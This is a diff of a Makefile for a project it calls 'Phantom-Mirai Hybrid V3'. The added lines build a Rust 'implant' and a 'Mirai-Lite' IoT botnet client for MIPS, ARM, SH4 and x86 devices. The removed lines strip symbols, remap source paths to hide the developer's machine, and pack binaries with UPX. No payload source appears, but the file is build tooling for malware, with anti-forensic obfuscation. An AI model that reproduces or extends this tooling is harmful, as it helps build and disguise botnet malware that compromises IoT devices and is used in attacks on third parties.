@@ -1,131 +1,72 @@
-# Phantom Mesh "ULTIMATE" Build System
-# Optimization: Size (z), LTO (Fat), Strip (Symbols + Sections)
-# Obfuscation: Path Remapping, Metadata Removal
-# Architecture: Polyglot (Linux, Windows, macOS)
+# Phantom-Mirai Hybrid V3 Centralized Build System
 
-# --- Configuration ---
-CARGO := cargo
-OUT_DIR := dist
-PHANTOM_BIN := phantom
-MESH_BIN := phantom_mesh
-PWD := $(shell pwd)
+# Directories
+DIR_IOT = crates/nodes/iot
+DIR_PHANTOM = crates/nodes/phantom
+DIR_TC = scripts/toolchains
 
-# --- Compiler Flags (The "Secret Sauce") ---
-# 1. Basic Optimizations
-# FLAGS_OPT := -C opt-level=z -C lto=fat -C codegen-units=1 -C panic=abort -C embed-bitcode=yes 
-FLAGS_OPT := # Rely on Cargo.toml for optimization to avoid proc-macro LTO issues 
+# Toolchain Paths (Adjust based on extracted folders from setup_toolchains.sh)
+# Examples based on standard RootSec naming
+CC_MIPS = $(DIR_TC)/cross-compiler-mips/bin/mips-gcc
+CC_MIPSEL = $(DIR_TC)/cross-compiler-mipsel/bin/mipsel-gcc
+CC_ARM = $(DIR_TC)/cross-compiler-armv4l/bin/armv4l-gcc
+CC_ARM7 = $(DIR_TC)/cross-compiler-armv7l/bin/armv7l-gcc
+CC_SH4 = $(DIR_TC)/cross-compiler-sh4/bin/sh4-gcc
+CC_X86 = $(DIR_TC)/cross-compiler-i586/bin/i586-gcc
+CC_X86_64 = $(DIR_TC)/cross-compiler-x86_64/bin/x86_64-gcc
 
-# 2. Low-Level Control
-# - force-frame-pointers=no: Save registers, smaller stack frames
-# - relocation-model=static: No PIC overhead for executables (Linux only usually, but good to try)
-FLAGS_LOW := -C force-frame-pointers=no
+# List of IoT Architectures to build
+IOT_ARCHS = mips mipsel arm arm7 sh4 x86 x86_64
 
-# 3. Obfuscation & Anonymity
-# - strip=symbols: Remove all debug symbols
-# - remap-path-prefix: CRITICAL. Hides "/Users/zvwgvx/..." => "/src". 防止 lộ đường dẫn máy dev.
-FLAGS_OBF := -C strip=symbols \
-             --remap-path-prefix $(PWD)=/void \
-             --remap-path-prefix $(HOME)=/root \
-             --remap-path-prefix .rustup=/stdlib
+.PHONY: all phantom iot clean $(IOT_ARCHS)
 
-# Combined Flags
-RUSTFLAGS_COMMON := $(FLAGS_OPT) $(FLAGS_LOW) $(FLAGS_OBF)
+all: phantom iot
 
-# Post-Processing Tools
-STRIP_LINUX := strip --strip-all --remove-section=.comment --remove-section=.note
-STRIP_MAC := strip -x
-UPX := upx --best --lzma
-
-# --- Targets ---
-.PHONY: all setup clean phantom mesh_local mesh_linux mesh_windows help compress
-
-# Build native binaries for the current Host OS (Guaranteed to work)
-all: setup phantom mesh_macos_arm64 mesh_linux_amd64 mesh_linux_arm64 mesh_windows_amd64
-	@echo "\n[✓] ALL BUILDS COMPLETE. Artifacts in 'dist/'"
-	@echo "[!] Note: Targets follow naming convention: {module}_{os}_{arch}"
-
-setup:
-	@mkdir -p $(OUT_DIR)
-
-# 1. Phantom Node (Host/macOS)
+# --- Phantom (Rust Implant) ---
 phantom:
-	@echo "\n[*] Building Phantom Node (Master)..."
-	@RUSTFLAGS="$(RUSTFLAGS_COMMON)" $(CARGO) build --release -p $(PHANTOM_BIN)
-	@cp target/release/$(PHANTOM_BIN) $(OUT_DIR)/phantom
-	@$(STRIP_MAC) $(OUT_DIR)/phantom 2>/dev/null || echo "[!] Strip failed (ignore if signed)"
-	@echo "[+] Artifact: $(OUT_DIR)/phantom"
+	@echo "[+] Building Phantom Core (Rust)..."
+	cd $(DIR_PHANTOM) && cargo build --release
+	@echo "[+] Phantom Built: $(DIR_PHANTOM)/target/release/phantom_core"
 
-# 2. Mesh Node (macOS ARM64 / Host)
-# Target: Host Native (arm64)
-mesh_macos_arm64: setup
-	@echo "\n[*] Building Mesh Node (macOS ARM64)..."
-	@RUSTFLAGS="$(RUSTFLAGS_COMMON)" $(CARGO) build --release -p $(MESH_BIN)
-	@cp target/release/$(MESH_BIN) $(OUT_DIR)/mesh_macos_arm64
-	@$(STRIP_MAC) $(OUT_DIR)/mesh_macos_arm64 2>/dev/null || echo "[!] Strip failed"
-	@echo "[+] Artifact: $(OUT_DIR)/mesh_macos_arm64"
+# --- IoT (Mirai-Lite C) ---
+iot: $(IOT_ARCHS)
 
-# 3. Mesh Node (Linux AMD64 / x64)
-# Target: x86_64-unknown-linux-musl
-mesh_linux_amd64: setup
-	@echo "\n[*] Building Mesh Node (Linux AMD64 - Static/MUSL)..."
-	@RUSTFLAGS="$(RUSTFLAGS_COMMON) -C target-feature=+crt-static" \
-	CARGO_TARGET_X86_64_UNKNOWN_LINUX_MUSL_LINKER=x86_64-linux-musl-gcc \
-	CC_x86_64_unknown_linux_musl=x86_64-linux-musl-gcc \
-	CXX_x86_64_unknown_linux_musl=x86_64-linux-musl-g++ \
-	AR_x86_64_unknown_linux_musl=x86_64-linux-musl-ar \
-	$(CARGO) build --release --target x86_64-unknown-linux-musl -p $(MESH_BIN) && \
-	cp target/x86_64-unknown-linux-musl/release/$(MESH_BIN) $(OUT_DIR)/mesh_linux_amd64 && \
-	echo "[*] Stripping metadata..." && \
-	($(STRIP_LINUX) $(OUT_DIR)/mesh_linux_amd64 2>/dev/null || strip $(OUT_DIR)/mesh_linux_amd64) && \
-	echo "[+] Artifact: $(OUT_DIR)/mesh_linux_amd64"
+# Individual Arch Rules
+mips:
+	@echo "[*] Building IoT for MIPS..."
+	$(MAKE) -C $(DIR_IOT) CC="$(CC_MIPS)" TARGET="mirai_mips" clean all
 
-# 4. Mesh Node (Linux ARM64 / Raspberry Pi)
-# Target: aarch64-unknown-linux-musl
-mesh_linux_arm64: setup
-	@echo "\n[*] Building Mesh Node (Linux ARM64 - Raspberry Pi)..."
-	@RUSTFLAGS="$(RUSTFLAGS_COMMON) -C target-feature=+crt-static" \
-	CARGO_TARGET_AARCH64_UNKNOWN_LINUX_MUSL_LINKER=aarch64-linux-musl-gcc \
-	CC_aarch64_unknown_linux_musl=aarch64-linux-musl-gcc \
-	CXX_aarch64_unknown_linux_musl=aarch64-linux-musl-g++ \
-	AR_aarch64_unknown_linux_musl=aarch64-linux-musl-ar \
-	$(CARGO) build --release --target aarch64-unknown-linux-musl -p $(MESH_BIN) && \
-	cp target/aarch64-unknown-linux-musl/release/$(MESH_BIN) $(OUT_DIR)/mesh_linux_arm64 && \
-	echo "[*] Stripping metadata..." && \
-	($(STRIP_LINUX) $(OUT_DIR)/mesh_linux_arm64 2>/dev/null || strip $(OUT_DIR)/mesh_linux_arm64) && \
-	echo "[+] Artifact: $(OUT_DIR)/mesh_linux_arm64"
+mipsel:
+	@echo "[*] Building IoT for MIPSEL..."
+	$(MAKE) -C $(DIR_IOT) CC="$(CC_MIPSEL)" TARGET="mirai_mipsel" clean all
 
-# 5. Mesh Node (Windows AMD64 / x64)
-# Target: x86_64-pc-windows-gnu
-mesh_windows_amd64:
-	@echo "\n[*] Building Mesh Node (Windows AMD64)..."
-	@echo "[!] Warning: Requires mingw-w64 installed."
-	@RUSTFLAGS="$(RUSTFLAGS_COMMON) -C link-arg=-s" \
-	$(CARGO) build --release --target x86_64-pc-windows-gnu -p $(MESH_BIN) && \
-	cp target/x86_64-pc-windows-gnu/release/$(MESH_BIN).exe $(OUT_DIR)/mesh_windows_amd64.exe && \
-	echo "[+] Artifact: $(OUT_DIR)/mesh_windows_amd64.exe"
+arm:
+	@echo "[*] Building IoT for ARMv4..."
+	$(MAKE) -C $(DIR_IOT) CC="$(CC_ARM)" TARGET="mirai_arm" clean all
 
-# 5. Optional: UPX Compression (The "Crunch")
-compress:
-	@echo "\n[*] Attempting UPX Compression..."
-	@$(UPX) $(OUT_DIR)/mesh_macos_arm64 || echo "[!] UPX failed for macOS"
-	@$(UPX) $(OUT_DIR)/mesh_linux_amd64 || echo "[!] UPX failed for Linux AMD64"
-	@$(UPX) $(OUT_DIR)/mesh_linux_arm64 || echo "[!] UPX failed for Linux ARM64"
-	@$(UPX) $(OUT_DIR)/mesh_windows_amd64.exe || echo "[!] UPX failed for Windows"
-	@echo "[+] Compression attempts finished."
+arm7:
+	@echo "[*] Building IoT for ARMv7..."
+	$(MAKE) -C $(DIR_IOT) CC="$(CC_ARM7)" TARGET="mirai_arm7" clean all
+
+sh4:
+	@echo "[*] Building IoT for SH4..."
+	$(MAKE) -C $(DIR_IOT) CC="$(CC_SH4)" TARGET="mirai_sh4" clean all
+
+x86:
+	@echo "[*] Building IoT for x86..."
+	$(MAKE) -C $(DIR_IOT) CC="$(CC_X86)" TARGET="mirai_x86" clean all
+
+x86_64:
+	@echo "[*] Building IoT for x86_64..."
+	$(MAKE) -C $(DIR_IOT) CC="$(CC_X86_64)" TARGET="mirai_x86_64" clean all
+
+# Local Debug Build (Host OS)
+iot_debug:
+	@echo "[*] Building IoT for Host (Debug)..."
+	$(MAKE) -C $(DIR_IOT) clean all
 
 clean:
-	@rm -rf $(OUT_DIR)
-	@$(CARGO) clean
-	@echo "[✓] Cleaned."
-
-help:
-	@echo "Phantom Mesh ULTIMATE Build"
-	@echo "---------------------------"
-	@echo "Targets:"
-	@echo "  make all"
-	@echo "  make phantom"
-	@echo "  make mesh_macos_arm64"
-	@echo "  make mesh_linux_amd64"
-	@echo "  make mesh_linux_arm64"
-	@echo "  make mesh_windows_amd64"
-	@echo "  make compress"
+	@echo "[-] Cleaning Phantom..."
+	cd $(DIR_PHANTOM) && cargo clean
+	@echo "[-] Cleaning IoT..."
+	$(MAKE) -C $(DIR_IOT) clean
